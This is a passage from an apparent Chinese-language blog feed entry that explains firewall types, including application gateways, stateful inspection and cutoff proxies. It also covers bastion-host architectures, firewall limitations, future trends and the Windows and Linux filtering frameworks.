具有超强的<strong>日志功能</strong>。<strong>包过滤防火墙</strong>的日志仅能记录<strong>时间、地址、协议、端口</strong>，而应用级网关的日志要明确得多。(例如，应用级网关可以记录用户通过HTTP访问了哪些网站页面、通过FTP上传或下载了什么文件、通过SMTP给谁发送了邮件，甚至邮件的主题、附件等信息，都可以作为日志的内容)</p><p>(4) 应用级网关防火墙的<strong>规则配置比较简单</strong>。关注的重点是应用服务，而不必像配置包过滤防火墙还要考虑规则顺序的问题</p><p><strong>应用级网关的缺点</strong></p><p>(1) 灵活性很差，对每一种应用都需要设置一个代理</p><p>(2) 配置烦琐，增加了管理员的工作量</p><p>(3) 性能不高,一旦超负荷，就有可能发生停机,从而导致整个网络中断</p><hr><h2 id="0x06-状态检测防火墙"><a href="#0x06-状态检测防火墙" class="headerlink" title="0x06 状态检测防火墙"></a>0x06 状态检测防火墙</h2><h3 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1. 概述"></a>1. 概述</h3><p>状态检测技术是防火墙近几年才应用的新技术，状态检测技术采用的是一种<strong>基于连接的状态检测机制</strong>，将属于同一连接的所有包作为一个数据流的整体看待，构成连接状态表，通过<strong>规则表</strong>与<strong>状态表</strong>的共同配合，对表中的各个连接状态因素加以识别。这里动态连接状态表中的记录可以是<strong>以前的通信信息</strong>，也可以是其他相关<strong>应用程序的信息</strong></p><h3 id="2-工作原理"><a href="#2-工作原理" class="headerlink" title="2. 工作原理"></a>2. 工作原理</h3><p>先进的状态检测防火墙读取、分析和利用了全面的<strong>网络通信信息和状态</strong></p><p><strong>(1) 通信信息：即所有7层协议的当前信息</strong> </p><p>防火墙的检测模块位于操作系统的<strong>内核</strong>，在网络层之下，能在数据包到达网关操作系统之前对它们进行分析。防火墙先在<strong>低协议层</strong>上<strong>检查</strong>数据包是否满足企业的安全策略，对于满足的数据包，再从更<strong>高协议层</strong>上进行<strong>分析</strong>)</p><p><strong>(2) 通信状态：即以前的通信信息</strong> </p><p>状态检测防火墙在<strong>状态表</strong>中保存以前的通信信息，<strong>记录</strong>从受保护网络发出的数据包的<strong>状态信息</strong>，如IP请求的服务器地址和端口，然后，防火墙根据该表内容对返回<strong>受保护</strong>网络的数据包进行分析判断，这样，只有响应受保护网络请求的数据包才被放行。对于UDP或RPC等<strong>无连接的协议</strong>，检测模块可<strong>创建虚会话信息</strong>用来进行跟踪</p><p><strong>(3) 应用状态：即其他相关应用的信息</strong> </p><p>状态检测模块能够<strong>理解并学习</strong>各种协议和应用，以支持各种最新的应用，它比代理服务器支持的协议和应用要多得多；并且，它能从应用程序中<strong>收集状态信息</strong>并存入状态表中，以供其他应用或协议做检测策略。例如，已经通过防火墙认证的用户可以通过防火墙访问其他授权的服务</p><p><strong>(4) 操作信息：即在数据包中能执行逻辑运算或数学运算的信息</strong></p><p>状态监测技术采用强大的<strong>面向对象</strong>的方法，基于通信信息、通信状态、应用状态等多方面因素，利用灵活的表达式形式，结合安全规则、应用识别知识、状态关联信息及通信数据，构造更<strong>复杂</strong>的、更<strong>灵活</strong>的、满足用户<strong>特定</strong>安全要求的策略规则</p><h3 id="3-安全性讨论"><a href="#3-安全性讨论" class="headerlink" title="3. 安全性讨论"></a>3. 安全性讨论</h3><p><strong>状态检测防火墙优点</strong></p><p>(1) 具备动态包过滤的所有优点，同时具有更高的安全性</p><p>(2) 没有打破客户/服务器模型</p><p>(3) 提供集成的动态(状态)包过滤功能</p><p>(4) 当以动态包过滤模式运行时，其速度很快</p><p><strong>状态检测防火墙缺陷</strong></p><p>(1) 由于状态检测引擎采用单线程进程，此设计将对防火墙的性能产生很大影响</p><p>(2) 没有打破客户/服务器结构会产生不可接受的安全风险，攻击者可以直接与受保护的服务器建立连接</p><p>(3) 如果实现方案依赖于操作系统的Inetd守护进程，其并发连接数量将受到严重限制，从而不能满足当今网络对高并发连接数量的要求</p><hr><h2 id="0x07-切换代理"><a href="#0x07-切换代理" class="headerlink" title="0x07 切换代理"></a>0x07 切换代理</h2><h3 id="1-工作原理-1"><a href="#1-工作原理-1" class="headerlink" title="1. 工作原理"></a>1. 工作原理</h3><p>切换代理(Cutoff Proxy)实际上是动态(状态)包过滤器和一个电路级代理的结合。切换代理<strong>首先起电路级代理的作用</strong>，以验证RFC建议的三步握手，然后再<strong>切换到动态包过滤</strong>的工作模式下。因此，切换代理首先工作于OSI的会话层，即第5层；当连接完成后，再切换到动态包过滤模式，即工作于OSI的第3层</p><h3 id="2-工作过程"><a href="#2-工作过程" class="headerlink" title="2. 工作过程"></a>2. 工作过程</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%88%87%E6%8D%A2%E4%BB%A3%E7%90%86.png" alt=""></p><h3 id="3-安全性讨论-1"><a href="#3-安全性讨论-1" class="headerlink" title="3. 安全性讨论"></a>3. 安全性讨论</h3><p>(1) 切换代理与传统的电路级代理不同：电路级代理能在连接持续期间打破客户/服务器模式，而切换代理却不能。远端的客户机与防火墙后面受保护的服务器之间仍然能够建立直接的连接</p><p>(2) 如果安全策略规定需要对一些基本的服务进行认证并检查三步握手，而且不需要打破客户/服务器模式，那么切换代理就是一个非常合适的选择。切换代理绝不等同于电路级代理，因为在建立连接之后的通信期间，它并未打破客户/服务器的工作模式</p><h3 id="4-优点与缺陷"><a href="#4-优点与缺陷" class="headerlink" title="4. 优点与缺陷"></a>4. 优点与缺陷</h3><p><strong>切换代理优点</strong></p><p>(1) 与传统的电路级网关相比，它对网络性能造成的影响要小</p><p>(2) 由于对三步握手进行了验证，所以降低了IP欺骗的风险</p><p><strong>切换代理缺陷</strong></p><p>(1) 它不是一个电路级网关</p><p>(2) 仍然具有动态包过滤器遗留的许多缺陷</p><p>(3) 由于没有检查数据包的净荷部分，因此具有较低的安全性</p><p>(4) 难于创建规则(受先后次序的影响)</p><p>(5) 安全性不及传统的电路级网关</p><hr><h2 id="0x08-防火墙体系结构"><a href="#0x08-防火墙体系结构" class="headerlink" title="0x08 防火墙体系结构"></a>0x08 防火墙体系结构</h2><h3 id="1-堡垒主机-Bastion-Host"><a href="#1-堡垒主机-Bastion-Host" class="headerlink" title="1. 堡垒主机(Bastion Host)"></a>1. 堡垒主机(Bastion Host)</h3><p><strong>(1) 概念</strong></p><p>堡垒主机(Bastion Host)是一种配置了较为全面的安全防范措施的网络上的计算机，它为网络间的通信提供了一个<strong>阻塞点</strong>。通常堡垒主机可以用作应用级和电路级网关的<strong>平台</strong>，是一个组织机构网络安全的中心主机</p><p><strong>(2) 特征</strong></p><ol><li><p>堡垒主机硬件平台运行较为安全的操作系统，成为可信任的系统</p></li><li><p>只有网络管理员认为必要的服务才会安装在堡垒主机上。这些服务包含了代理服务，如Telnet，DNS，FTP，SMTP以及用户认证等</p></li><li><p>当允许一个用户访问代理服务时，堡垒主机可能会要求进行额外认证。另外，每一个代理服务都可能需要相应的鉴别机制( Authentication)</p></li><li><p>每一个代理都只能支持标准应用服务命令集中的一个子集</p></li><li><p>每一个代理只允许访问指定主机的通信。这意味着每一个代理通过对所用的网络流量、每一个连接及其持续时间记录日志，保留了详细的审计信息。审计日志对检测和终止入侵者极为重要</p></li><li><p>每一个代理模块都是一个为网络安全设计的一个很小的软件包</p></li><li><p>代理之间相互独立</p></li><li><p>代理通常无需进行磁盘访问，不需要读取初始配置文件。使得入侵者很难在主机上安装Trojan horse、sniffers或其他危险的文件</p></li><li><p>堡垒主机是一个组织机构网络安全的中心主机。堡垒主机是由网络管理员严密监视的，堡垒主机软件和系统的安全情况应该定期地进行审查，对访问记录应进行查看，以防潜在的安全漏洞和对堡垒主机的试探性攻击</p></li></ol><h3 id="2-典型体系结构"><a href="#2-典型体系结构" class="headerlink" title="2. 典型体系结构"></a>2. 典型体系结构</h3><p><strong>(1) 屏蔽主机模式</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%B1%8F%E8%94%BD%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F.png" alt=""></p><p>1.屏蔽主机模式防火墙(Screened Firewall)由<strong>包过滤路由器</strong>和<strong>堡垒主机</strong>组成。在这种模式下，<strong>所有的网络流量</strong>都必须通过堡垒主机</p><ul><li><p>对于来自外部网络的网络流量，只有发往堡垒主机的IP数据包才被允许通过</p></li><li><p>对于来自内部网络的网络流量，只有来自堡垒主机的IP数据包才被允许通过</p></li></ul><p>2.屏蔽主机模式防火墙的实质就是<strong>包过滤</strong>和<strong>代理服务功能</strong>的结合。堡垒主机担任了身份鉴别和代理服务的功能。这样的配置更加安全</p><ul><li><p>首先，这种配置能够实现数据包级过滤和应用级过滤，在定义安全策略时有相当的灵活性</p></li><li><p>其次，在入侵者威胁到内部网络的安全以前，必须能够“穿透”两个独立的系统（包过滤路由器和堡垒主机）</p></li><li><p>这种配置在对Internet进行直接访问时，有更大的灵活性。例如，内部网络中有一个公共信息服务器，如Web服务器，这时，可以配置路由器允许网络流量在信息服务器和Internet之间传输</p></li><li><p>单宿主机模式存在一个缺陷：一旦过滤路由器遭到破坏，堡垒主机就可能被越过，使得内部网络完全暴露</p></li></ul><p><strong>(2) 双宿/多宿主机模式</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%A4%9A%E5%AE%BF%E4%B8%BB.png" alt=""></p><ol><li><p>双宿/多宿主机模式防火墙 (Dual-homed/MultiHomedFirewall)，又称为双宿/多宿网关防火墙</p></li><li><p>它是一种拥有两个或多个连接到不同网络上的网络接口的防火墙。通常用一台装有两块或多块网卡的堡垒主机作为防火墙，每块网卡各自与受保护网和外部网连接</p></li><li><p>该模式下，堡垒主机关闭了IP转发功能，其网关功能是通过提供代理服务而不是通过 IP转发来实现的。显然只有特定类型的协议请求才能被代理<br>服务处理。于是，网关采用了“缺省拒绝”策略以得到很高的安全性</p></li><li><p>这种体系结构的防火墙简单明了，易于实现，成本低，能够为内外网提供检测、认证、日志等功能</p></li><li><p>这种结构也存在弱点，一旦黑客侵入堡垒主机并打开其IP转发功能，则任何网上用户均可随意访问内部网络。因此，双宿/多宿网关防火墙对不可信任的外部主机的访问必须进行严格的身份验证</p></li></ol><p><strong>(3) 屏蔽子网模式</strong></p><p>与前面几种配置模式相比，屏蔽子网模式防火墙(Screened Subnet Mode Firewall) 是最为安全的一种配置模式。它采用了两个包过滤路由器：一个位于堡垒主机和外部网络(Internet)之间；另一个位于堡垒主机和内部网络之间。该配置模式在内部网与外部网络之间建立了一个被隔离的子网</p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%B1%8F%E8%94%BD%E5%AD%90%E7%BD%91.png" alt=""></p><ol><li><p>周边防御网络是位于内部网络与外部网络之间的一个安全子网，分别和内外两个路由器相连。这个子网被定义为“非军事区”(demilitarized zone)网络，这一网络所受到的威胁不会影响到内部网络</p></li><li><p>可以将堡垒主机、Web服务器、E-mail服务器等公用服务器放在非军事区网络中，将重要的数据放在内部网服务器上。内部网络和外部网络均可访问屏蔽子网，但禁止它们穿过屏蔽子网通信。在这一配置中，内网增加了一台内部包过滤路由器，该路由器与外部路由器的过滤规则完全不同，它只允许源于堡垒主机的数据包进入</p></li><li><p>这种防火墙安全性好，但成本高。即使外部路由器和堡垒主机被入侵者控制，内部网络仍受到内部包过滤路由器的保护</p></li></ol><hr><h2 id="0x09-防火墙缺陷及发展"><a href="#0x09-防火墙缺陷及发展" class="headerlink" title="0x09 防火墙缺陷及发展"></a>0x09 防火墙缺陷及发展</h2><h3 id="1-防火墙缺陷"><a href="#1-防火墙缺陷" class="headerlink" title="1. 防火墙缺陷"></a>1. 防火墙缺陷</h3><p>(1) 防火墙不能防范不经由防火墙的攻击</p><p>如果允许从受保护网内部不受限制的向外拨号，一些用户可以形成与Internet的直接的SLIP或PPP连接，从而绕过防火墙，造成一个潜在的后门攻击渠道</p><p>(2) 防火墙目前还不能防止感染了病毒的软件或文件的传输，只能在每台主机上装反病毒软件</p><p>(3) 防火墙不能防止数据驱动式攻击</p><p>有些表面看来无害的数据被邮寄或复制到Internet主机上并被执行而发起攻击时，就会发生数据驱动攻击。例如，一种数据驱动的攻击可以使一台主机修改与安全有关的文件，从而使入侵者下一次更容易入侵该系统</p><p>(4) 防火墙还存在着安装、管理、配置复杂的缺点，在高流量的网络中，防火墙还容易成为网络的瓶颈</p><h3 id="2-发展趋势"><a href="#2-发展趋势" class="headerlink" title="2. 发展趋势"></a>2. 发展趋势</h3><p><strong>(1) 优良的性能</strong></p><ul><li><p>传统的代理型防火墙虽然可以提供较高级别的安全保护，但是同时它也成为限制网络带宽的瓶颈，极大地制约了在网络中的实际应用。<strong>数据通过率</strong>是表示防火墙性能的参数，由于不同防火墙的不同功能具有不同的工作量和系统资源要求，因此数据在通过防火墙时会产生延时。现在大多数的防火墙产品都支持<strong>NAT功能</strong>，它可以让受防火墙保护的一边的IP地址不至于暴露在没有保护的另一边，但启用NAT后，势必会对防火墙系统性能有所影响。另外防火墙系统中集成的<strong>VPN解决方案</strong>必须是真正的线速运行，否则将成为网络通信的瓶颈</p></li><li><p>采用复杂的加密算法时，防火墙性能尤为重要</p></li></ul><p><strong>(2) 可扩展的结构和功能</strong></p><ul><li><p>防火墙系统规模和功能应该能适应内部网络的规模和安全策略的变化，</p></li><li><p>防火墙除了具有保护网络安全的基本功能外，还提供对VPN的支持，同时还应该具有可扩展的内驻应用层代<br>理。除了支持常见的网络服务以外，还应该能够按照用户的需求提供相应的代理服务</p></li><li><p>未来的防火墙系统应是一个<strong>可随意伸缩</strong>的<strong>模块化解决方案</strong>，从最为基本的包过滤器到带加密功能的VPN型包过滤器，直至一个独立的应用网关，使用户有充分的余地构建自己所需要的防火墙体系</p></li></ul><p><strong>(3) 简化的安装与管理</strong></p><p>将具有非常易于进行配置的图形用户界面，NT防火墙市场的发展证明了这种趋势</p><p><strong>(4) 主动过滤</strong></p><p>具有内置病毒和内容扫描功能或允许用户将病毒与内容扫描程序进行集成</p><p><strong>(5) 防病毒与防黑客</strong></p><p>TCP／IP 协议套件中存在的脆弱性使Internet对<strong>拒绝服务攻击</strong>敞开了大门。防火墙厂商一直在尽其可能阻止拒绝服务攻击。像对付序列号预测和IP欺骗这类简单攻击，这些年来已经成为了防火墙工具箱的一部分。像“SYN泛滥”这类更复杂的拒绝服务攻击需要厂商部署更先进的检测和避免方案来对付</p><p><strong>(6) 发展联动技术</strong></p><p>联动即通过一种<strong>组合</strong>的方式，将不同的技术与防火墙技术进行整合，在提高防火墙自身功能和性能的同时，由其他技术完成防火墙所缺乏的功能，以适应网络安全<strong>整体化、立体化</strong>的要求</p><ul><li><p>防火墙与<strong>防病毒产品</strong>联动，可以在网关处查杀病毒，将病毒的发作限制在最小的可能</p></li><li><p>防火墙与<strong>认证系统</strong>联动，可以在制定安全策略时使用强度更大、安全性更高的认证体系</p></li><li><p>防火墙与<strong>入侵检测系统</strong>联动，可以对网络进行动静结合的保护</p></li><li><p>防火墙与<strong>日志分析系统</strong>联动</p></li></ul><h3 id="3-趋势总结"><a href="#3-趋势总结" class="headerlink" title="3. 趋势总结"></a>3. 趋势总结</h3><p>未来防火墙技术会全面考虑<strong>网络安全、操作系统安全、应用程序安全、用户的安全、数据安全</strong>，五者综合应用；此外，网络的防火墙产品还将把网络前沿技术，如Web页面超高速缓存、虚拟网络和带宽管理、与其它安全<strong>技术联动</strong>等与其自身结合起来</p><hr><h2 id="0x0A-防火墙设计及配置"><a href="#0x0A-防火墙设计及配置" class="headerlink" title="0x0A 防火墙设计及配置"></a>0x0A 防火墙设计及配置</h2><p>现代操作系统已经集成了基本的防火墙架构，只需在相关的架构上加入自定义的软件模块，就可以实现高强度的防火墙功能 </p><h3 id="1-Firewall-Windows"><a href="#1-Firewall-Windows" class="headerlink" title="1. Firewall-Windows"></a>1. Firewall-Windows</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/windows.png" alt=""></p><p><strong>(1) 用户级：</strong>SPI接口，包过滤接口</p><p><strong>(2) 内核级：</strong>TDI过滤驱动程序，NDIS中间层过滤驱动程序，NDIS过滤钩子驱动程序</p><h3 id="2-Firewall-Linux"><a href="#2-Firewall-Linux" class="headerlink" title="2. Firewall-Linux"></a>2. Firewall-Linux</h3><p>(1) Linux kernel 集成了过滤系统</p><ul><li>2.0 ipfwadm</li><li>2.2 ipchains</li><li>2.4以上内核：netfilter/iptables</li></ul><p>(2) 大多数Linux下的防火墙都是在这些过滤系统之上开发设计的。通过LKM注册钩子函数，实现对数据的检测，从而实现自定义的防火墙</p><p>(3) 商用防火墙大多在netfilter/iptables上开发</p><hr><h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul><li><p><a href="https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki</a></p></li><li><p><a href="http://staff.ustc.edu.cn/~billzeng/senis/nis06.pdf" target="_blank" rel="noopener">http://staff.ustc.edu.cn/~billzeng/senis/nis06.pdf</a></p></li><li><p><a href="https://www.secrss.com/search?keywords=%E9%98%B2%E7%81%AB%E5%A2%99" target="_blank" rel="noopener">https://www.secrss.com/firewall</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;防火墙(firewall)是一种保护计算机网络安全的技术性措施，它通过在网络边界上建立相应的网络通信监控系统来隔离内部和外部网络，以阻挡来自外部的网络入侵。本文对防火墙技术及其发展进行简要分析与总结&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="网络安全" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Firewall" scheme="http://www.firehacker.top/tags/Firewall/"/>
    
  </entry>
  
</feed>
